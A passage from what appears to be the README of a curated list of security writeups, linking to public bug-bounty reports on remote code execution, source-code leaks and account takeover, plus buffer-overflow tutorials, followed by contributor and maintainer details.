- [Magento – RCE & Local File Read with low privilege admin rights](https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/)
- [RCE in Nokia.com](https://medium.com/@sampanna/rce-in-nokia-com-59b308e4e882)
- [Two RCE in SharePoint](https://soroush.secproject.com/blog/2018/12/story-of-two-published-rces-in-sharepoint-workflows/)
- [Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over](https://medium.com/bugbountywriteup/token-brute-force-to-account-take-over-to-privilege-escalation-to-organization-take-over-650d14c7ce7f)
- [RCE in Hubspot with EL injection in HubL](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [Github Desktop RCE](https://pwning.re/2018/12/04/github-desktop-rce/)
- [eBay Source Code leak](https://slashcrypto.org/2018/11/28/eBay-source-code-leak/)
- [Facebook source code disclosure in ads API](https://www.amolbaikar.com/facebook-source-code-disclosure-in-ads-api/)
- [XS-Searching Google’s bug tracker to find out vulnerable source code](https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549)

## Buffer Overflow Writeups

-[Buffer Overflow Attack Book pdf](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)
-[Github Reposirtory on Buffer Overflow Attack](https://github.com/npapernot/buffer-overflow-attack)
-[Stack-Based Buffer Overflow Attacks: Explained and Examples](https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/)
-[How Buffer Overflow Attacks Work](https://www.netsparker.com/blog/web-security/buffer-overflow-attacks/)
-[Binary Exploitation: Buffer Overflows](https://blog.usejournal.com/binary-exploitation-buffer-overflows-a9dc63e8b546)
-[WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS](https://www.veracode.com/security/buffer-overflow)

## Contributing 
- Open Pull Requests
- Send me links of writeups to My Twitter : [0xAsm0d3us](https://twitter.com/0xAsm0d3us)


## Maintainers 

`This Repo is maintained by : `

- [devanshbatham](https://github.com/devanshbatham)
- [e13v3n-0xb](https://github.com/e13v3n-0xb)
